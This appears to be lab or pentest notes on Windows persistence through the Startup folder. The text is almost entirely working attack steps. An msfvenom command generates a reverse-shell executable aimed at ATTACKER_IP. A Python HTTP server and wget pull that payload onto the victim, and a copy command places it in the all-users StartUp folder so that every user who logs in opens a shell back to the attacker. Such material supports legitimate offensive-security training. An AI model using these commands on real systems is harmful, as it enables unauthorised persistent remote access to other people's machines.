Startup folder:

Each user has a folder under:
    -C:\Users\<your_username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup 
    
where you can put executables to be run whenever the user logs in. 
We can achieve persistence just by dropping a payload in there. 


If we want to force all users to run a payload while logging in, we can use the folder under:
    -C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp

For this task, let's generate a reverse shell payload using msfvenom:

    -kali$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4545 -f exe -o revshell.exe
We will then copy our payload into the victim machine. 

You can spawn an http.server with Python3 and use wget on the victim machine to pull your file:

    -kali$ python3 -m http.server 


Windows: We will download the MSF Payload
 Windows Powershell:
        -wget http://ATTACKER_IP:8000/revshell.exe -O revshell.exe

We then store the payload into the: 
    -C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp folder 
    to get a shell back for any user logging into the machine.

Command Prompt:
    -C:\> copy revshell.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\"
Now be sure to sign out of your session from the start menu (closing the RDP window is not enough as it leaves your session open):

    -sign out

And log back via RDP. You should immediately receive a connection back to your attacker's machine.
